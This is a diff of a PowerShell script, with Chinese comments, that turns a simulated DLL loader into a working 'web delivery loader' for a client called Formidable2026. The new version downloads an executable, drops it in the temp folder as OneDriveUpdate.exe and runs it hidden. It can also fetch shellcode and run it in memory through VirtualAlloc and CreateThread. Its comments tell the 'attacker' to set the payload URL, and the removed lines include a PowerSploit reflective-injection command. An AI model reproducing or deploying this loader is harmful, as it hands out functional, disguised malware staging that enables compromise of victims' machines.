@@ -1,57 +1,101 @@
 ﻿<#
-    PowerShell Reflective Loader for Formidable2026
+    PowerShell Web Delivery Loader for Formidable2026
     -----------------------------------------------
-    此脚本演示如何从网络下载 ClientDLL.dll 并通过反射加载（或简单的字节加载）在内存中执行。
-    注意：为了实现真正的"反射加载"，通常需要 DLL 导出 ReflectiveLoader 函数（ReflectiveDLLInjection）。
-    本示例演示最基础的加载方式：
-    1. 下载 DLL 到内存
-    2. 加载程序集 (如果是 .NET DLL) 或者使用 Win32 API 加载
+    功能: 从指定的 URL 下载并执行 Formidable 客户端。
+    支持: 
+    1. 下载 EXE 并运行 (Disk Drop)
+    2. 下载 ShellCode 并在内存执行 (Fileless, 需要 sRDI 生成的 bin)
     
-    对于非托管 C++ DLL (ClientDLL.dll)，PowerShell 无法直接像 .NET 那样 [Reflection.Assembly]::Load。
-    通常需要使用 "Invoke-ReflectivePEInjection" 脚本（来自 PowerSploit）。
-    
-    为了演示，这里提供一个简化的 Loader 框架，它会下载 DLL 到临时目录并加载（模拟 DLL 侧加载），
-    或者如果配合 PowerSploit 使用，可以实现内存加载。
-
-    这里提供一个更通用的 "下载并运行" 脚本，模拟加载过程。
+    使用方法:
+    powershell -ExecutionPolicy Bypass -File Loader.ps1
 #>
 
-$url = "http://127.0.0.1:8080/ClientDLL.dll"
-$tempPath = [System.IO.Path]::GetTempPath()
-$dllPath = Join-Path $tempPath "FormidableCore.dll"
+# 配置部分 (攻击者需修改)
+$PayloadUrl = "http://127.0.0.1:8080/Client.exe"  # 下载地址
+$PayloadType = "EXE"                              # "EXE" 或 "ShellCode"
+$DropPath = "$env:TEMP\OneDriveUpdate.exe"        # EXE 落地路径
 
-Write-Host "[*] Downloading payload from $url..."
-try {
-    # 模拟下载
-    # Invoke-WebRequest -Uri $url -OutFile $dllPath
+# ---------------------------------------------------------------------------
+
+function Run-Exe {
+    param([string]$Url, [string]$Path)
     
-    # 实际场景中，这里可能是 base64 解码
-    Write-Host "[*] (Simulation) Decoding payload..."
+    Write-Host "[*] Downloading EXE from $Url..."
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        $WebClient = New-Object System.Net.WebClient
+        $WebClient.DownloadFile($Url, $Path)
+        
+        Write-Host "[+] Downloaded to $Path"
+        Write-Host "[*] Executing..."
+        Start-Process -FilePath $Path -WindowStyle Hidden
+        Write-Host "[+] Execution started."
+    }
+    catch {
+        Write-Error "[-] Failed: $_"
+    }
+}
+
+function Run-ShellCode {
+    param([string]$Url)
     
-    # 加载 DLL
-    Write-Host "[*] Loading DLL..."
-    $signature = @"
-[DllImport("kernel32.dll")]
-public static extern IntPtr LoadLibrary(string lpFileName);
+    Write-Host "[*] Downloading ShellCode from $Url..."
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        $WebClient = New-Object System.Net.WebClient
+        [byte[]]$ShellCode = $WebClient.DownloadData($Url)
+        
+        Write-Host "[+] Downloaded $( $ShellCode.Length ) bytes."
+        
+        # 申请内存
+        $Win32 = @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class Kernel32 {
+            [DllImport("kernel32")]
+            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+            [DllImport("kernel32")]
+            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+            [DllImport("kernel32")]
+            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+        }
 "@
-    $type = Add-Type -MemberDefinition $signature -Name "Win32" -Namespace Win32Functions -PassThru
-    
-    # 在实际攻击中，通常不落地文件，而是使用 Reflective PE Injection
-    # 但由于我们是原生 C++ DLL，最简单的方式是落地加载，或者使用 Invoke-ReflectivePEInjection
-    
-    # $handle = $type::LoadLibrary($dllPath)
-    Write-Host "[+] DLL Loaded. Handle: $handle"
-    Write-Host "[*] ClientCore should be running in background thread."
-}
-catch {
-    Write-Error "Failed to load payload: $_"
+        Add-Type $Win32
+        
+        $MemSize = $ShellCode.Length
+        $ExecMem = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $MemSize, 0x3000, 0x40) # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        
+        if ($ExecMem -eq [IntPtr]::Zero) {
+            Write-Error "[-] VirtualAlloc failed."
+            return
+        }
+        
+        # 复制数据
+        [System.Runtime.InteropServices.Marshal]::Copy($ShellCode, 0, $ExecMem, $MemSize)
+        
+        # 执行
+        Write-Host "[*] Executing in memory..."
+        $hThread = [Kernel32]::CreateThread([IntPtr]::Zero, 0, $ExecMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        
+        if ($hThread -eq [IntPtr]::Zero) {
+            Write-Error "[-] CreateThread failed."
+            return
+        }
+        
+        [Kernel32]::WaitForSingleObject($hThread, 0xFFFFFFFF)
+    }
+    catch {
+        Write-Error "[-] Failed: $_"
+    }
 }
 
-# ---------------------------------------------------------------------------
-# 真正的内存加载方案 (Reflective PE Injection) 指南
-# ---------------------------------------------------------------------------
-# 1. 编译 ClientDLL.dll
-# 2. 使用 PowerSploit 的 Invoke-ReflectivePEInjection.ps1
-# 3. 命令:
-#    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
-#    Invoke-ReflectivePEInjection -PEBytes $bytes
+# 主逻辑
+if ($PayloadType -eq "EXE") {
+    Run-Exe -Url $PayloadUrl -Path $DropPath
+}
+elseif ($PayloadType -eq "ShellCode") {
+    Run-ShellCode -Url $PayloadUrl
+}
+else {
+    Write-Error "Unknown PayloadType: $PayloadType"
+}
